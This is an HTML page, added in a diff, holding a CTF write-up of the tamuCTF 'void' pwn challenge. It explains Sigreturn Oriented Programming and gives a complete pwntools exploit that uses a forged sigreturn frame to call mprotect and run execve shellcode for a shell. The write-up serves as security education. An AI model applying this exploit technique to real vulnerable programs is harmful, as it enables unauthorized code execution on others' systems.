@@ -1,0 +1,265 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/pwning/tamuCTF/void/">
+        <link rel="shortcut icon" href="../../../img/favicon.ico">
+        <title>void - CTF-Writeups</title>
+        <link href="../../../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/styles/darcula.min.css">
+
+        <script src="../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../js/bootstrap.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.5.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-dark">
+            <div class="container">
+                <a class="navbar-brand" href="../../..">CTF-Writeups</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-toggle="collapse" data-target="#navbar-collapse">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="navitem">
+                                <a href="../../../about/" class="nav-link">About Us</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="../../../shaktictf/" class="nav-link">ShaktiCTF</a>
+                            </li>
+                            <li class="navitem">
+                                <a href="https://team-shakti.github.io/" class="nav-link">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ml-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li class="nav-item">
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/pwning/tamuCTF/void.md" class="nav-link">Edit on Team-Shakti/CTF-Write-ups
+                                    </a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-light navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-secondary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-level="1"><a href="#void" class="nav-link">void</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-level="2"><a href="#preliminary-checks" class="nav-link">Preliminary checks:</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#analysis" class="nav-link">Analysis:</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#srop" class="nav-link">SROP</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-level="2"><a href="#exploit" class="nav-link">Exploit:</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="void">void</h1>
+<p>Points: 272</p>
+<p>This was one of the good challenges that I tried during the CTF. It was based on a technique called SROP (Sigreturn Oriented Programming). </p>
+<p>The purpose of this challenge was to defeat ASLR and so the binary as such consisted of only two functions - <code>main</code> and <code>_start</code> both written in simple assembly making use of syscalls. </p>
+<p>I'll take you through challenge and how I solved it! </p>
+<h2 id="preliminary-checks">Preliminary checks:</h2>
+<pre><code>void: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=7fd635b160836aff1b92af6f203e3b1f160f54cc, not stripped
+</code></pre>
+<pre><code>Canary                        : ✘ 
+NX                            : ✓ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : ✘ 
+gef➤  
+</code></pre>
+<p>As we can see, it is a 64-bit statically linked binary and only NX is enabled! So we'll need to figure out a way to inject shellcode and execute, if at all we use that approach. We will see how that can be done soon enough!
+For now let's analyze the binary further! </p>
+<h2 id="analysis">Analysis:</h2>
+<pre><code>gef➤  info functions
+All defined functions:
+
+Non-debugging symbols:
+0x0000000000401000  main
+0x0000000000401020  _start
+gef➤  disas main
+Dump of assembler code for function main:
+   0x0000000000401000 &lt;+0&gt;: mov    rax,0x0
+   0x0000000000401007 &lt;+7&gt;: mov    rdi,0x0
+   0x000000000040100e &lt;+14&gt;:    mov    rsi,rsp
+   0x0000000000401011 &lt;+17&gt;:    mov    rdx,0x7d0
+   0x0000000000401018 &lt;+24&gt;:    syscall 
+   0x000000000040101a &lt;+26&gt;:    ret    
+End of assembler dump.
+gef➤  disas _start
+Dump of assembler code for function _start:
+   0x0000000000401020 &lt;+0&gt;: xor    eax,eax
+   0x0000000000401022 &lt;+2&gt;: call   0x401000 &lt;main&gt;
+   0x0000000000401027 &lt;+7&gt;: mov    rax,0x3c
+   0x000000000040102e &lt;+14&gt;:    mov    rdi,0x0
+   0x0000000000401035 &lt;+21&gt;:    syscall 
+   0x0000000000401037 &lt;+23&gt;:    ret    
+End of assembler dump.
+gef➤  
+</code></pre>
+<p>Above is the assmbly dump for the two functions <code>main</code> and <code>_start</code>. As we can see there are no other functions, and the binary is statically linked, with no procedure linkage table or got address available during run time. Due to this, it becomes a challenge to obtain a leak! 
+Hoewever if we dive into the program, we can see that, the <code>main()</code> function reads input from user. However, there is no stack frame defined and rsi points to the top of the stack. So eventually whatever input we give, it will remain at the top of the stack and will get executed as the next instruction.</p>
+<p>So how do we go about it? Before discussing that, let us understand what does SROP mean and how it works.</p>
+<h2 id="srop">SROP</h2>
+<p>SROP stands for Sigreturn Oriented Programming and unlike Return Oriented Programming (ROP), it requires only two gadgets: <code>syscall</code> and a way to set <code>rax</code> register to <code>0xf</code>. In this challenge, it was quite difficult to write 0xf to rax as there weren't suitable gadgets available. But we can make use of the read syscall in main() to read 0xf bytes of input. With this, rax will store the number of characters read, i.e 0xf. Then we call syscall on it. This process comprises of the sigreturn syscall. </p>
+<p>The sigreturn is used to return from the signal handler and to clean up the stack frame after a signal has been unblocked. And "cleaning up the stack frame" really means it's restoring important context data that has been saved on the stack temporarily. This data includes values of all registers and some things that are unrelevant for exploitation, which is also the reason why at least 300 bytes are required for it to work. Since we can read upto 2000 bytes of data, it won't be a problem.</p>
+<p>For exploitation sake, we make use of <code>SigreturnFrame()</code> available in pwntools. We can in fact control all registers with this gadget. Before moving onto the exploit, I'd like to remind you that NX is enabled, and since there is no libc we canot ret2libc either. So to break this barrier, we can use the mprotect syscall, to give <code>rwx</code> permissions to a certain bss section, wherein we can read our shellcode to, and execute it. As there is no stack frame defined, we add a stack frame with <code>asm(add rsp, 100)</code>, place our shellcode into it, and execute it. (The shellcode used is an execve 64-bit) </p>
+<h2 id="exploit">Exploit:</h2>
+<pre><code>from pwn import *
+context.arch = 'amd64'
+context.log_level = &quot;debug&quot;
+
+#p = remote(&quot;tamuctf.com&quot;, 443, ssl=True, sni=&quot;void&quot;)
+p = process('./void')
+#gdb.attach(p, gdbscript='set disassembly-flavor intel\nb*main\nc\n')
+
+main = 0x0000000000401000
+ret = 0x40101a
+syscall = 0x0000000000401018
+start = 0x400020
+
+frame = SigreturnFrame()
+frame.rax = 10
+frame.rdi = 0x00000000400000
+frame.rsi = 0x1000
+frame.rdx = 0x7
+frame.rsp = 0x00000000400018# ptr to start
+frame.rip = syscall# mprotect syscall
+
+chain = p64(main)
+
+print(str(frame))
+pay = p64(main) + p64(syscall) + bytes(frame)
+p.send(pay)
+sleep(0.1)
+
+p.send(p64(syscall).ljust(15, b'\x00'))
+sleep(0.1)
+p.send(p64(start) + asm('add rsp, 100') + asm(shellcraft.sh()))
+sleep(0.1)
+
+p.interactive()
+</code></pre></div>
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
